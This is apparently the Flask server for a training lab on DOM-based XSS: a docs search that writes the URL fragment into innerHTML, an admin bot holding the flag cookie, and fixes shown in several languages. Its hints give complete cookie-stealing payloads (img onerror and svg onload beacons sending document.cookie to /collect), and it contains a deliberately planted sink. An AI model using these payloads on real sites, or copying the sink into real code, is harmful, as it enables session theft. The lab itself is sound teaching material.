"""
WildWebApps lab - Reflected XSS (Client-Side / DOM-based).

The vulnerability is real, and it lives entirely in client-side JavaScript: the
docs search reads its term from the URL FRAGMENT (``location.hash``) and writes
it into the page with ``element.innerHTML`` (see static/app.js, the block marked
=== VULNERABILITY ===). The server never sees the fragment and never reflects
anything - it returns the same static page every time. The unsafe write happens
in the browser, so this is DOM-based XSS, not server-side reflection.

Two consequences that make this lab different from entry 01 (server-side):
  * The payload travels in the ``#`` fragment, which browsers do NOT send to the
    server. View-Source shows nothing; the injected node only exists in the live
    DOM. Server-side output encoding cannot fix it.
  * The sink is ``innerHTML``. The HTML5 spec says a <script> inserted via
    innerHTML does NOT execute, so a bare <script> payload is inert here. The
    exploit must use an event-handler payload such as <img src=x onerror=...>
    or <svg onload=...>.

How the flag is gated behind exploitation
-----------------------------------------
The flag never appears in the page and is never sent to you directly. It lives
ONLY as a (non-HttpOnly) session cookie in the *admin bot's* browser. Your own
browser holds no secret. To win you must:

  1. craft a URL whose ``#`` fragment injects an event-handler payload,
  2. get the admin bot to open it via "Report to admin" (POST /report),
  3. have your script read ``document.cookie`` and beacon it to the same-origin
     collector (GET /collect), which appends it to /loot,
  4. read the flag from /loot and submit it.

The admin bot is a headless Chromium driven by Playwright. Everything stays on
127.0.0.1 and runs fully offline after the image is built.
"""
import os
import time
from urllib.parse import urlsplit

from flask import (
    Flask, render_template, request, jsonify, redirect, url_for, Response,
)

import vulnlab

app = Flask(__name__)

# Fresh random MD5 flag for this process (rotates on every restart).
FLAG = vulnlab.generate_flag()

PORT = int(os.environ.get("PORT", "8000"))
# The admin bot always browses the lab on its own loopback, regardless of what
# host the attacker puts in the reported URL (keeps the lab offline + localhost).
LOCAL_BASE = f"http://127.0.0.1:{PORT}"

# In-memory "attacker collector". Whatever an injected script beacons to
# /collect lands here and is shown on /loot. Capped so the lab can't grow forever.
LOOT: list[dict] = []
LOOT_MAX = 50


# ── The admin victim ─────────────────────────────────────────────────────────
def admin_visit(path_and_query: str) -> str:
    """
    Open `LOCAL_BASE + path_and_query` in a headless browser that is "logged in"
    as the admin - i.e. its browser context carries the flag as a readable
    cookie. The reported URL keeps its `#fragment`; the page's own JavaScript
    reads that fragment and writes it into the DOM, so an injected event-handler
    payload runs here, in the admin's session. Returns "" on success or a short
    error string.
    """
    try:
        from playwright.sync_api import sync_playwright
    except Exception as exc:  # Playwright missing - only happens outside the image
        return f"admin browser unavailable: {exc}"

    target = LOCAL_BASE + path_and_query
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                args=["--no-sandbox", "--disable-dev-shm-usage"]
            )
            try:
                ctx = browser.new_context()
                # The secret the attacker is after: a non-HttpOnly session cookie.
                ctx.add_cookies([{
                    "name": "session_flag",
                    "value": FLAG,
                    "url": LOCAL_BASE,
                    "httpOnly": False,   # readable by document.cookie - that's the point
                    "sameSite": "Lax",
                }])
                page = ctx.new_page()
                # wait_until="load" then a short pause: the fragment is present in
                # the URL, the page's load handler runs the sink, and an injected
                # onerror/onload beacon has time to fire.
                page.goto(target, wait_until="load", timeout=8000)
                page.wait_for_timeout(900)
            finally:
                browser.close()
        return ""
    except Exception as exc:
        return f"admin visit failed: {exc}"


# ── Page content (themed lab chrome) ─────────────────────────────────────────
# DOM-based XSS is a client-side JavaScript flaw, so the canonical examples are
# JavaScript and TypeScript. A server language hosts it only by SHIPPING a
# vulnerable client script; the one lever that language actually controls is the
# security headers it sends (Content-Security-Policy / Trusted Types). The server
# tabs show exactly that, and say so - no server-side string encoding can fix a
# sink that runs in the browser.
LANGUAGES = {
    "JavaScript": {
        "vuln": (
            "// source: the URL fragment (never sent to the server)\n"
            "const term = decodeURIComponent(location.hash.slice(1));\n"
            "// VULNERABLE: untrusted source written to an innerHTML sink\n"
            "document.getElementById('out').innerHTML = term;"
        ),
        "fixed": (
            "const term = decodeURIComponent(location.hash.slice(1));\n"
            "// FIXED: textContent never parses HTML (use DOMPurify if HTML is needed)\n"
            "document.getElementById('out').textContent = term;"
        ),
        "doc": "https://developer.mozilla.org/en-US/docs/Web/API/Node/textContent",
    },
    "TypeScript": {
        "vuln": (
            "const term = decodeURIComponent(location.hash.slice(1));\n"
            "const out = document.getElementById('out') as HTMLElement;\n"
            "// VULNERABLE: types don't stop XSS - innerHTML still parses HTML\n"
            "out.innerHTML = term;"
        ),
        "fixed": (
            "import DOMPurify from 'dompurify';\n"
            "const term = decodeURIComponent(location.hash.slice(1));\n"
            "// FIXED: sanitize before innerHTML, or use textContent for plain text\n"
            "out.innerHTML = DOMPurify.sanitize(term);"
        ),
        "doc": "https://github.com/cure53/DOMPurify",
    },
    "Python": {
        "vuln": (
            "# Flask/Jinja: the bug is in the inline JS this template ships,\n"
            "# not in Python. Jinja autoescaping does NOT cover a JS sink.\n"
            "return render_template_string(\n"
            "  '<div id=out></div><script>'\n"
            "  'out.innerHTML=decodeURIComponent(location.hash.slice(1))'  # sink\n"
            "  '</script>')"
        ),
        "fixed": (
            "# FIX is client-side (textContent). The server's lever is a header:\n"
            "@app.after_request\n"
            "def csp(resp):\n"
            "  resp.headers['Content-Security-Policy'] = \"require-trusted-types-for 'script'\"\n"
            "  return resp"
        ),
        "doc": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/require-trusted-types-for",
    },
    "Java": {
        "vuln": (
            "// JSP/Servlet: the sink lives in the inline JS the page emits.\n"
            "out.println(\"<div id=out></div><script>\"\n"
            "  + \"out.innerHTML=decodeURIComponent(location.hash.slice(1))\"  // sink\n"
            "  + \"</script>\");"
        ),
        "fixed": (
            "// FIX the script (textContent); server-side, ship a CSP header:\n"
            "resp.setHeader(\"Content-Security-Policy\",\n"
            "  \"require-trusted-types-for 'script'\");"
        ),
        "doc": "https://owasp.org/www-community/controls/Content_Security_Policy",
    },
    "PHP": {
        "vuln": (
            "// The flaw is in the client script PHP echoes, not in PHP.\n"
            "echo '<div id=out></div><script>'\n"
            "   . 'out.innerHTML=decodeURIComponent(location.hash.slice(1))'  // sink\n"
            "   . '</script>';"
        ),
        "fixed": (
            "// FIX the sink (textContent); server-side, send a CSP header:\n"
            "header(\"Content-Security-Policy: require-trusted-types-for 'script'\");"
        ),
        "doc": "https://www.php.net/manual/en/function.header.php",
    },
    "Ruby": {
        "vuln": (
            "# Sinatra/ERB: the sink is in the inline JS the view renders.\n"
            "'<div id=out></div><script>' \\\n"
            "'out.innerHTML=decodeURIComponent(location.hash.slice(1))' \\\n"
            "'</script>'  # sink"
        ),
        "fixed": (
            "# FIX the script (textContent); server-side, set a CSP header:\n"
            "headers 'Content-Security-Policy' =>\n"
            "  \"require-trusted-types-for 'script'\""
        ),
        "doc": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy",
    },
    "Go": {
        "vuln": (
            "// html/template escapes values it INTERPOLATES, but here the\n"
            "// script reads location.hash at runtime - Go never sees it.\n"
            "io.WriteString(w, `<div id=out></div><script>`+\n"
            "  `out.innerHTML=decodeURIComponent(location.hash.slice(1))`+ // sink\n"
            "  `</script>`)"
        ),
        "fixed": (
            "// FIX the script (textContent); server-side, send a CSP header:\n"
            "w.Header().Set(\"Content-Security-Policy\",\n"
            "  \"require-trusted-types-for 'script'\")"
        ),
        "doc": "https://pkg.go.dev/net/http#Header.Set",
    },
    "C#": {
        "vuln": (
            "// Razor/ASP.NET: the sink is the inline JS the view emits.\n"
            "return Results.Content(\"<div id=out></div><script>\" +\n"
            "  \"out.innerHTML=decodeURIComponent(location.hash.slice(1))\" + // sink\n"
            "  \"</script>\", \"text/html\");"
        ),
        "fixed": (
            "// FIX the script (textContent); server-side, add a CSP header:\n"
            "Response.Headers.Append(\"Content-Security-Policy\",\n"
            "  \"require-trusted-types-for 'script'\");"
        ),
        "doc": "https://learn.microsoft.com/en-us/aspnet/core/security/content-security-policy",
    },
}

CONTEXT = vulnlab.lab_context(
    title="Reflected XSS (Client-Side) - Docs Search",
    owasp="A05:2025 - Injection",
    summary=(
        "This docs search renders your term entirely in the browser: client-side "
        "JavaScript reads it from the URL fragment (#...) and writes it into the "
        "page with innerHTML. The server never sees the fragment and reflects "
        "nothing, so View-Source is clean - this is DOM-based XSS. Your browser "
        "holds no secret, but the admin bot does. Exploit the sink to steal the "
        "admin's session cookie and recover the flag."
    ),
    instructions=[
        "Search for anything: the term appears after the # in the URL and is "
        "rendered by client JS via innerHTML. View-Source shows nothing - open "
        "DevTools (Inspect) to see the injected node in the live DOM.",
        "Your own session has no flag. The admin bot is logged in and its cookie "
        "(session_flag) is readable by JavaScript.",
        "Because the sink is innerHTML, a bare <script> will NOT run. Use an "
        "event-handler payload (e.g. <img src=x onerror=...> or <svg onload=...>) "
        "in the # fragment.",
        "Paste that full URL into 'Report to admin'. The bot opens it, its JS "
        "reads your fragment, and your payload runs in the admin's session.",
        "Open /loot, read the stolen session_flag value, and submit it below.",
    ],
    hints=[
        "Confirm the sink in your own browser first. The search keeps state in "
        "the fragment, so this runs your payload:  "
        "#<img src=x onerror=alert(1)>",
        "The collector at /collect accepts the cookie via GET or POST as the `c` "
        "parameter, so any channel works. Three equivalent fragment payloads "
        "(all event-handler based, since innerHTML won't run <script>):  "
        "(1) <img src=x onerror=\"new Image().src=`/collect?c=${encodeURIComponent(document.cookie)}`\">  "
        "(2) <img src=x onerror=\"fetch(`/collect?c=${encodeURIComponent(document.cookie)}`)\">  "
        "(3) <svg onload=\"navigator.sendBeacon(`/collect?c=${encodeURIComponent(document.cookie)}`)\">",
        "Put the payload after the # and report the full URL, e.g.  "
        "http://127.0.0.1:8000/#<img src=x onerror=\"fetch(`/collect?c=${encodeURIComponent(document.cookie)}`)\">  "
        "then open /loot to read the stolen session_flag.",
        "Real-world control: serve  "
        "Content-Security-Policy: require-trusted-types-for 'script'; default-src 'self'  "
        "so innerHTML can no longer accept a raw string (Trusted Types), and a "
        "connect-src/img-src limited to trusted origins blocks the beacon. The "
        "true fix is in the client code: write the term with textContent, or "
        "sanitize it with DOMPurify before innerHTML. This lab ships neither so "
        "the payloads above all work.",
    ],
    languages=LANGUAGES,
    references=[
        ("OWASP - DOM Based XSS", "https://owasp.org/www-community/attacks/DOM_Based_XSS"),
        ("OWASP Cheat Sheet - DOM based XSS Prevention", "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html"),
        ("PortSwigger - DOM-based XSS", "https://portswigger.net/web-security/cross-site-scripting/dom-based"),
    ],
)


# ── Routes ───────────────────────────────────────────────────────────────────
@app.route("/")
def index():
    # NOTE: there is deliberately NO server-side reflection here. The page is
    # static; the vulnerability is entirely in static/app.js, which reads
    # location.hash and writes it to innerHTML. The fragment never reaches this
    # handler (browsers don't send it), which is the whole point of DOM-based XSS.
    return render_template("index.html", **CONTEXT)


@app.route("/report", methods=["POST"])
def report():
    """Deliver an attacker URL to the admin bot, which opens it while logged in."""
    raw = request.form.get("url", "")
    # Only the path + query + FRAGMENT are used; the host is forced to the local
    # lab so the bot can never be aimed at anything but 127.0.0.1 (no SSRF, stays
    # offline). The fragment MUST be preserved - it carries the DOM-XSS payload.
    parts = urlsplit(raw)
    path_and_query = parts.path or "/"
    if parts.query:
        path_and_query += "?" + parts.query
    if parts.fragment:
        path_and_query += "#" + parts.fragment
    if not path_and_query.startswith("/"):
        path_and_query = "/" + path_and_query

    err = admin_visit(path_and_query)
    return redirect(url_for("loot", err=err) if err else url_for("loot"))


@app.route("/collect", methods=["GET", "POST"])
def collect():
    """Attacker's collector. An injected script beacons the stolen cookie here."""
    data = request.values.get("c", "")
    if data:
        LOOT.append({
            "time": time.strftime("%H:%M:%S"),
            "src": request.remote_addr or "?",
            "data": data,
        })
        del LOOT[:-LOOT_MAX]
    # 1x1 transparent GIF so an <img>/Image() beacon loads cleanly.
    gif = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!"
           b"\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01"
           b"\x00\x00\x02\x02D\x01\x00;")
    return Response(gif, mimetype="image/gif")


@app.route("/loot")
def loot():
    """The attacker's view of captured data (values are auto-escaped by Jinja)."""
    return render_template("loot.html", loot=list(reversed(LOOT)),
                           err=request.args.get("err", ""), **CONTEXT)


@app.route("/check", methods=["POST"])
def check():
    submitted = request.form.get("flag", "")
    return jsonify(correct=vulnlab.check_flag(FLAG, submitted))


if __name__ == "__main__":
    host = os.environ.get("HOST", "127.0.0.1")
    app.run(host=host, port=PORT, debug=False)
